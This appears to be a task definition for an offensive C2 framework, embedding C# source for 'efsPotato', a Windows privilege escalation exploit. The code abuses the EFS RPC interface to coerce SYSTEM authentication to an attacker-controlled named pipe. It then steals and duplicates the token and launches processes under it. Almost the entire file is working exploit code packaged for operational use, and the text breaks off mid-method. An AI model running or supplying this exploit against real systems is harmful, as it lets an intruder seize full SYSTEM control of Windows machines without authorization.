- Author:
    Name: ''
    Handle: ''
    Link: ''
  Name: efsPotato
  Aliases: []
  Description: efs potato
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: >-
    using System;

    using System.Diagnostics;

    using System.Runtime.InteropServices;

    using System.Security.Permissions;

    using System.Threading;

    using SweetPotato;

    using System.ComponentModel;

    using System.Globalization;

    using System.IO.Pipes;

    using System.Linq;

    using System.Security.Principal;


    public static class Task

    {
        static string output = "";

        public static string Execute(string cmd)
        {

            string program;
            string programArgs = "";

            cmd = cmd.Trim();

            if (string.IsNullOrEmpty(cmd))
            {
                program = programArgs = "";
            }
            else if (cmd.Contains(' '))
            {
                program = cmd?.Split(' ')[0];
                programArgs = cmd?.Split(' ').Skip(1).ToString();
            }
            else
            {
                program = cmd;
            }

            try
            {

                bool hasImpersonate = ImpersonationToken.EnablePrivilege(ImpersonationToken.SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = ImpersonationToken.EnablePrivilege(ImpersonationToken.SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = ImpersonationToken.EnablePrivilege(ImpersonationToken.SecurityEntity.SE_INCREASE_QUOTA_NAME);


                if (!hasImpersonate && !hasPrimary)
                {
                    output += "[!] Cannot perform interception, necessary privileges missing.  Are you running under a Service account?" + Environment.NewLine;
                    return output;
                }

                EfsRpc efsRpc = new EfsRpc();
                Thread.Sleep(1000);
                try
                {
                    efsRpc.TriggerEfsRpc();
                }
                catch (Exception)
                {

                    throw;
                }


                if (!efsRpc.HasToken)
                {
                    output += "[!] No authenticated interception took place, exploit failed" + Environment.NewLine;
                    return output;
                }
                output += "[+] Intercepted and authenticated successfully" + Environment.NewLine;

                IntPtr impersonatedPrimary;

                if (!ImpersonationToken.DuplicateTokenEx(efsRpc.Token, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, ImpersonationToken.TOKEN_TYPE.TokenPrimary, out impersonatedPrimary))
                {
                    output += "[!] Failed to impersonate security context token" + Environment.NewLine;
                    return output;
                }


                // if program and args are not null
                ImpersonationToken.STARTUPINFO si = new ImpersonationToken.STARTUPINFO();
                ImpersonationToken.PROCESS_INFORMATION pi = new ImpersonationToken.PROCESS_INFORMATION();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = @"WinSta0\Default";

                if (program != null && program != string.Empty)
                {
                    if (!ImpersonationToken.CreateProcessWithTokenW(impersonatedPrimary, 0, program, programArgs, ImpersonationToken.CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi))
                    {
                        output += $"[!] Failed to created impersonated process with token: {Marshal.GetLastWin32Error()}" + Environment.NewLine;
                        return output;
                    } 
                    else
                    {
                        output += "created process with token" + Environment.NewLine;
                    }
                }
                else
                {
                    try
                    {
                        output += "current process " + Process.GetCurrentProcess().Id + " thread : " + Thread.CurrentThread.ManagedThreadId + Environment.NewLine;

                        output += "current (before impersonation) : " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + Environment.NewLine;
                        //var result = ImpersonationToken.ImpersonateLoggedOnUser(impersonatedPrimary);
                        var result = WindowsIdentity.Impersonate(impersonatedPrimary);
                        output += "impersonated efs rpc token : " + WindowsIdentity.GetCurrent().Name + Environment.NewLine;

                    }
                    catch (Exception ex)
                    {

                        Console.ForegroundColor = ConsoleColor.Red;
                        output += ex.Message;
                    } 
                }
            }
            catch (Exception e)
            {
                output += "[!] Failed to exploit EfsRpc: {0} " + e.Message + Environment.NewLine;
                output += e.StackTrace.ToString() + Environment.NewLine;
            }


            return output;
        }

        internal class EfsRpc
        {
            string pipeName = Guid.NewGuid().ToString();

            NamedPipeServerStream efsrpcPipe;
            Thread efsrpcPipeThread;
            IntPtr systemImpersonationToken = IntPtr.Zero;

            public IntPtr Token { get { return systemImpersonationToken; } }
            public bool HasToken { get { return (systemImpersonationToken != IntPtr.Zero); } }
            void EfsRpcPipeThread()
            {

                byte[] data = new byte[4];

                efsrpcPipe = new NamedPipeServerStream($"{pipeName}\\pipe\\srvsvc", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);
                efsrpcPipe.WaitForConnection();

                output += "[+] Server connected to our evil RPC pipe" + Environment.NewLine;

                efsrpcPipe.Read(data, 0, 4);

                efsrpcPipe.RunAsClient(() => {
                    if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
                        ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle))
                    {
                        output += "[-] Failed to open thread token" + Environment.NewLine;
                        return;
                    }

                    if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
                        ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken))
                    {
                        output += "[-] Failed to duplicate impersonation token" + Environment.NewLine;
                        return;
                    }

                    output += "[+] Duplicated impersonation token" + Environment.NewLine;
                });

                efsrpcPipe.Close();
            }

            public EfsRpc()
            {
                efsrpcPipeThread = new Thread(EfsRpcPipeThread);
                efsrpcPipeThread.Start();
            }

            public void TriggerEfsRpc()
            {

                string targetPipe = string.Format($"\\\\localhost/pipe/{pipeName}/\\{pipeName}\\{pipeName}");
                //string targetPipe = string.Format($"\\\\localhost\\pipe\\{pipeName}\\pipe\\srvsvc");

                output += $"[+] Triggering name pipe access on evil PIPE {targetPipe}" + Environment.NewLine;

                SharpEfsTrigger.efs Efs = new SharpEfsTrigger.efs();
                Efs.EfsRpcEncryptFileSrv("localhost", targetPipe);
                //Efs.EfsRpcDecryptFileSrv("localhost", targetPipe, 0);
                // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112
            }
        }
    }


    namespace SweetPotato

    {
        public class ImpersonationToken
        {
            // Constants that are going to be used during our procedure.
            public static uint SE_PRIVILEGE_ENABLED = 0x00000002;
            public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
            public static uint STANDARD_RIGHTS_READ = 0x00020000;
            public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001;
            public static uint TOKEN_DUPLICATE = 0x00000002;
            public static uint TOKEN_IMPERSONATE = 0x00000004;
            public static uint TOKEN_QUERY = 0x00000008;
            public static uint TOKEN_QUERY_SOURCE = 0x00000010;
            public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
            public static uint TOKEN_ADJUST_GROUPS = 0x00000040;
            public static uint TOKEN_ADJUST_DEFAULT = 0x00000080;
            public static uint TOKEN_ADJUST_SESSIONID = 0x00000100;
            public static uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;
            public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
            public static uint MAXIMUM_ALLOWED = 0x02000000;

            public static uint DETACHED_PROCESS = 0x00000008;
            public static uint CREATE_NEW_CONSOLE = 0x00000010;


            public enum SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }

            public enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct LUID
            {
                internal Int32 LowPart;
                internal UInt32 HighPart;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct TOKEN_PRIVILEGES
            {
                internal Int32 PrivilegeCount;
                internal LUID Luid;
                internal UInt32 Attributes;
            }

            // This also works with CharSet.Ansi as long as the calling function uses the same character set.
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            public enum LogonFlags
            {
                WithProfile = 1,
                NetCredentialsOnly
            }

            public enum CreationFlags
            {
                DefaultErrorMode = 0x04000000,
                DetachedProcess = 0x00000008,
                NewConsole = 0x00000010,
                NewProcessGroup = 0x00000200,
                SeparateWOWVDM = 0x00000800,
                Suspended = 0x00000004,
                UnicodeEnvironment = 0x00000400,
                ExtendedStartupInfoPresent = 0x00080000
            }

            public enum SecurityEntity
            {
                SE_CREATE_TOKEN_NAME,
                SE_ASSIGNPRIMARYTOKEN_NAME,
                SE_LOCK_MEMORY_NAME,
                SE_INCREASE_QUOTA_NAME,
                SE_UNSOLICITED_INPUT_NAME,
                SE_MACHINE_ACCOUNT_NAME,
                SE_TCB_NAME,
                SE_SECURITY_NAME,
                SE_TAKE_OWNERSHIP_NAME,
                SE_LOAD_DRIVER_NAME,
                SE_SYSTEM_PROFILE_NAME,
                SE_SYSTEMTIME_NAME,
                SE_PROF_SINGLE_PROCESS_NAME,
                SE_INC_BASE_PRIORITY_NAME,
                SE_CREATE_PAGEFILE_NAME,
                SE_CREATE_PERMANENT_NAME,
                SE_BACKUP_NAME,
                SE_RESTORE_NAME,
                SE_SHUTDOWN_NAME,
                SE_DEBUG_NAME,
                SE_AUDIT_NAME,
                SE_SYSTEM_ENVIRONMENT_NAME,
                SE_CHANGE_NOTIFY_NAME,
                SE_REMOTE_SHUTDOWN_NAME,
                SE_UNDOCK_NAME,
                SE_SYNC_AGENT_NAME,
                SE_ENABLE_DELEGATION_NAME,
                SE_MANAGE_VOLUME_NAME,
                SE_IMPERSONATE_NAME,
                SE_CREATE_GLOBAL_NAME,
                SE_CREATE_SYMBOLIC_LINK_NAME,
                SE_INC_WORKING_SET_NAME,
                SE_RELABEL_NAME,
                SE_TIME_ZONE_NAME,
                SE_TRUSTED_CREDMAN_ACCESS_NAME
            }

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern Boolean ImpersonateLoggedOnUser(
                    IntPtr hToken
                );

            [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine,
                CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll")]
            public static extern uint WTSGetActiveConsoleSessionId();

            [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);

            [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool AdjustTokenPrivileges(IntPtr tokenhandle,
                                     [MarshalAs(UnmanagedType.Bool)] bool disableAllPrivileges,
                                     [MarshalAs(UnmanagedType.Struct)] ref TOKEN_PRIVILEGES newstate,
                                     uint bufferlength, IntPtr previousState, IntPtr returnlength);
            // OpenProcessToken
            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
                SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentProcess();

            [DllImport("kernel32.dll")]
            public static extern IntPtr GetCurrentThread();

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern Boolean CloseHandle(IntPtr hObject);

            [DllImport("userenv.dll", SetLastError = true)]
            public static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

            private static string GetSecurityEntityValue(SecurityEntity securityEntity)
            {
                switch (securityEntity)
                {
                    case SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME:
                        return "SeAssignPrimaryTokenPrivilege";
                    case SecurityEntity.SE_AUDIT_NAME:
                        return "SeAuditPrivilege";
                    case SecurityEntity.SE_BACKUP_NAME:
                        return "SeBackupPrivilege";
                    case SecurityEntity.SE_CHANGE_NOTIFY_NAME:
                        return "SeChangeNotifyPrivilege";
                    case SecurityEntity.SE_CREATE_GLOBAL_NAME:
                        return "SeCreateGlobalPrivilege";
                    case SecurityEntity.SE_CREATE_PAGEFILE_NAME:
                        return "SeCreatePagefilePrivilege";
                    case SecurityEntity.SE_CREATE_PERMANENT_NAME:
                        return "SeCreatePermanentPrivilege";
                    case SecurityEntity.SE_CREATE_SYMBOLIC_LINK_NAME:
                        return "SeCreateSymbolicLinkPrivilege";
                    case SecurityEntity.SE_CREATE_TOKEN_NAME:
                        return "SeCreateTokenPrivilege";
                    case SecurityEntity.SE_DEBUG_NAME:
                        return "SeDebugPrivilege";
                    case SecurityEntity.SE_ENABLE_DELEGATION_NAME:
                        return "SeEnableDelegationPrivilege";
                    case SecurityEntity.SE_IMPERSONATE_NAME:
                        return "SeImpersonatePrivilege";
                    case SecurityEntity.SE_INC_BASE_PRIORITY_NAME:
                        return "SeIncreaseBasePriorityPrivilege";
                    case SecurityEntity.SE_INCREASE_QUOTA_NAME:
                        return "SeIncreaseQuotaPrivilege";
                    case SecurityEntity.SE_INC_WORKING_SET_NAME:
                        return "SeIncreaseWorkingSetPrivilege";
                    case SecurityEntity.SE_LOAD_DRIVER_NAME:
                        return "SeLoadDriverPrivilege";
                    case SecurityEntity.SE_LOCK_MEMORY_NAME:
                        return "SeLockMemoryPrivilege";
                    case SecurityEntity.SE_MACHINE_ACCOUNT_NAME:
                        return "SeMachineAccountPrivilege";
                    case SecurityEntity.SE_MANAGE_VOLUME_NAME:
                        return "SeManageVolumePrivilege";
                    case SecurityEntity.SE_PROF_SINGLE_PROCESS_NAME:
                        return "SeProfileSingleProcessPrivilege";
                    case SecurityEntity.SE_RELABEL_NAME:
                        return "SeRelabelPrivilege";
                    case SecurityEntity.SE_REMOTE_SHUTDOWN_NAME:
                        return "SeRemoteShutdownPrivilege";
                    case SecurityEntity.SE_RESTORE_NAME:
                        return "SeRestorePrivilege";
                    case SecurityEntity.SE_SECURITY_NAME:
                        return "SeSecurityPrivilege";
                    case SecurityEntity.SE_SHUTDOWN_NAME:
                        return "SeShutdownPrivilege";
                    case SecurityEntity.SE_SYNC_AGENT_NAME:
                        return "SeSyncAgentPrivilege";
                    case SecurityEntity.SE_SYSTEM_ENVIRONMENT_NAME:
                        return "SeSystemEnvironmentPrivilege";
                    case SecurityEntity.SE_SYSTEM_PROFILE_NAME:
                        return "SeSystemProfilePrivilege";
                    case SecurityEntity.SE_SYSTEMTIME_NAME:
                        return "SeSystemtimePrivilege";
                    case SecurityEntity.SE_TAKE_OWNERSHIP_NAME:
                        return "SeTakeOwnershipPrivilege";
                    case SecurityEntity.SE_TCB_NAME:
                        return "SeTcbPrivilege";
                    case SecurityEntity.SE_TIME_ZONE_NAME:
                        return "SeTimeZonePrivilege";
                    case SecurityEntity.SE_TRUSTED_CREDMAN_ACCESS_NAME:
                        return "SeTrustedCredManAccessPrivilege";
                    case SecurityEntity.SE_UNDOCK_NAME:
                        return "SeUndockPrivilege";
                    default:
                        throw new ArgumentOutOfRangeException(typeof(SecurityEntity).Name);
                }
            }

            public static bool EnablePrivilege(SecurityEntity securityEntity)
            {
                const int ERROR_NOT_ALL_ASSIGNED = 1300;

                if (!Enum.IsDefined(typeof(SecurityEntity), securityEntity))
                    throw new InvalidEnumArgumentException("securityEntity", (int)securityEntity, typeof(SecurityEntity));

                var securityEntityValue = GetSecurityEntityValue(securityEntity);
                try
                {
                    var locallyUniqueIdentifier = new LUID();

                    if (LookupPrivilegeValue(null, securityEntityValue, ref locallyUniqueIdentifier))
                    {
                        var TOKEN_PRIVILEGES = new TOKEN_PRIVILEGES();
                        TOKEN_PRIVILEGES.PrivilegeCount = 1;
                        TOKEN_PRIVILEGES.Attributes = SE_PRIVILEGE_ENABLED;
                        TOKEN_PRIVILEGES.Luid = locallyUniqueIdentifier;

                        var tokenHandle = IntPtr.Zero;
                        try
                        {
                            var currentProcess = GetCurrentProcess();
                            if (OpenProcessToken(currentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle))
                            {
                                if (AdjustTokenPrivileges(tokenHandle, false,
                                                    ref TOKEN_PRIVILEGES,
                   1024, IntPtr.Zero, IntPtr.Zero))
                                {
                                    var lastError = Marshal.GetLastWin32Error();
                                    if (lastError == ERROR_NOT_ALL_ASSIGNED)
                                    {
                                        //Not likley to have the privilege
                                        return false;
                                    }
                                    else if (lastError != 0)
                                    {
                                        var win32Exception = new Win32Exception();
                                        throw new InvalidOperationException("AdjustTokenPrivileges failed.", win32Exception);
                                    }
                                    else
                                    {
                                        return true;
                                    }
                                }
                                else
                                {
                                    var win32Exception = new Win32Exception();
                                    throw new InvalidOperationException("AdjustTokenPrivileges failed.", win32Exception);
                                }
                            }
                            else
                            {
                                var win32Exception = new Win32Exception();

                                var exceptionMessage = string.Format(CultureInfo.InvariantCulture,
                                                    "OpenProcessToken failed. CurrentProcess: {0}",
                                                    currentProcess.ToInt32());

                                throw new InvalidOperationException(exceptionMessage, win32Exception);
                            }
                        }
                        finally
                        {
                            if (tokenHandle != IntPtr.Zero)
                                CloseHandle(tokenHandle);
                        }
                    }
                    else
                    {
                        var win32Exception = new Win32Exception();

                        var exceptionMessage = string.Format(CultureInfo.InvariantCulture,
                                            "LookupPrivilegeValue failed. SecurityEntityValue: {0}",
                                            securityEntityValue);

                        throw new InvalidOperationException(exceptionMessage, win32Exception);
                    }
                }
                catch (Exception e)
                {
                    var exceptionMessage = string.Format(CultureInfo.InvariantCulture,
                                     "GrandPrivilege failed. SecurityEntity: {0}",
                                     securityEntityValue);

                    throw new InvalidOperationException(exceptionMessage, e);
                }
            }
        }
    }


    namespace SharpEfsTrigger

    {
        //https://raw.githubusercontent.com/vletoux/pingcastle/19a3890b214bff7cb66b08c55bb4983ca21c8bd1/RPC/nativemethods.cs
        public class NativeMethods
        {
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);

            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern Int32 RpcBindingFree(ref IntPtr lpString);

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
            internal static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
            //        internal static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, ref SEC_WINNT_AUTH_IDENTITY AuthIdentity, UInt32 AuthzSvc);
            internal static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);

            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, out IntPtr hContext, string FileName, int Flags);

            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName, out IntPtr efsObject);

            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);

            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
            internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName, ulong Flags);

            //structs
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            internal struct SEC_WINNT_AUTH_IDENTITY
            {
                [MarshalAs(UnmanagedType.LPWStr)]
                public string User;

                public int UserLength;

                [MarshalAs(UnmanagedType.LPWStr)]
                public string Domain;

                public int DomainLength;

                [MarshalAs(UnmanagedType.LPWStr)]
                public string Password;

                public int PasswordLength;
                public int Flags;
            };

            [StructLayout(LayoutKind.Sequential)]
            public struct RPC_SECURITY_QOS
            {
                public Int32 Version;
                public Int32 Capabilities;
                public Int32 IdentityTracking;
                public Int32 ImpersonationType;
            };

            [StructLayout(LayoutKind.Sequential)]
            internal struct COMM_FAULT_OFFSETS
            {
                public short CommOffset;
                public short FaultOffset;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct RPC_VERSION
            {
                public ushort MajorVersion;
                public ushort MinorVersion;

                public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
                {
                    MajorVersion = InterfaceVersionMajor;
                    MinorVersion = InterfaceVersionMinor;
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct RPC_SYNTAX_IDENTIFIER
            {
                public Guid SyntaxGUID;
                public RPC_VERSION SyntaxVersion;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct RPC_CLIENT_INTERFACE
            {
                public uint Length;
                public RPC_SYNTAX_IDENTIFIER InterfaceId;
                public RPC_SYNTAX_IDENTIFIER TransferSyntax;
                public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
                public uint RpcProtseqEndpointCount;
                public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
                public IntPtr Reserved;
                public IntPtr InterpreterInfo;
                public uint Flags;

                public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

                public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
                {
                    Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
                    RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
                    InterfaceId = new RPC_SYNTAX_IDENTIFIER();
                    InterfaceId.SyntaxGUID = iid;
                    InterfaceId.SyntaxVersion = rpcVersion;
                    rpcVersion = new RPC_VERSION(2, 0);
                    TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
                    TransferSyntax.SyntaxGUID = IID_SYNTAX;
                    TransferSyntax.SyntaxVersion = rpcVersion;
                    DispatchTable = IntPtr.Zero;
                    RpcProtseqEndpointCount = 0u;
                    RpcProtseqEndpoint = IntPtr.Zero;
                    Reserved = IntPtr.Zero;
                    InterpreterInfo = IntPtr.Zero;
                    Flags = 0u;
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct MIDL_STUB_DESC
            {
                public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
                public IntPtr pfnAllocate;
                public IntPtr pfnFree;
                public IntPtr pAutoBindHandle;
                public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
                public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
                public IntPtr /*EXPR_EVAL*/ apfnExprEval;
                public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
                public IntPtr pFormatTypes;
                public int fCheckBounds;
                /* Ndr library version. */
                public uint Version;
                public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
                public int MIDLVersion;
                public IntPtr CommFaultOffsets;

                // New fields for version 3.0+
                public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;

                // Notify routines - added for NT5, MIDL 5.0
                public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;

                public IntPtr mFlags;

                // International support routines - added for 64bit post NT5
                public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;

                public IntPtr ProxyServerInfo;
                public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
                // Fields up to now present in win2000 release.

                public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                        IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
                {
                    pFormatTypes = pFormatTypesPtr;
                    RpcInterfaceInformation = RpcInterfaceInformationPtr;
                    CommFaultOffsets = IntPtr.Zero;
                    pfnAllocate = pfnAllocatePtr;
                    pfnFree = pfnFreePtr;
                    pAutoBindHandle = IntPtr.Zero;
                    apfnNdrRundownRoutines = IntPtr.Zero;
                    aGenericBindingRoutinePairs = IntPtr.Zero;
                    apfnExprEval = IntPtr.Zero;
                    aXmitQuintuple = IntPtr.Zero;
                    fCheckBounds = 1;
                    Version = 0x50002u;
                    pMallocFreeStruct = IntPtr.Zero;
                    MIDLVersion = 0x801026e;
                    aUserMarshalQuadruple = IntPtr.Zero;
                    NotifyRoutineTable = IntPtr.Zero;
                    mFlags = new IntPtr(0x00000001);
                    CsRoutineTables = IntPtr.Zero;
                    ProxyServerInfo = IntPtr.Zero;
                    pExprInfo = IntPtr.Zero;
                }
            }
        }
    }


    namespace SharpEfsTrigger

    {
        public abstract class efsapi
        {
            private byte[] MIDL_ProcFormatString;

            private byte[] MIDL_TypeFormatString;
            private GCHandle procString;
            private GCHandle formatString;
            private GCHandle stub;
            private GCHandle faultoffsets;
            private GCHandle clientinterface;
            private string PipeName;

            private allocmemory AllocateMemoryDelegate = AllocateMemory;
            private freememory FreeMemoryDelegate = FreeMemory;

            public UInt32 RPCTimeOut = 5000;

            protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
            {
                this.MIDL_ProcFormatString = MIDL_ProcFormatString;
                this.MIDL_TypeFormatString = MIDL_TypeFormatString;
                PipeName = pipe;
                procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

                NativeMethods.RPC_CLIENT_INTERFACE clientinterfaceObject = new NativeMethods.RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

                NativeMethods.COMM_FAULT_OFFSETS commFaultOffset = new NativeMethods.COMM_FAULT_OFFSETS();
                commFaultOffset.CommOffset = -1;
                commFaultOffset.FaultOffset = -1;
                faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
                clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
                formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

                NativeMethods.MIDL_STUB_DESC stubObject = new NativeMethods.MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
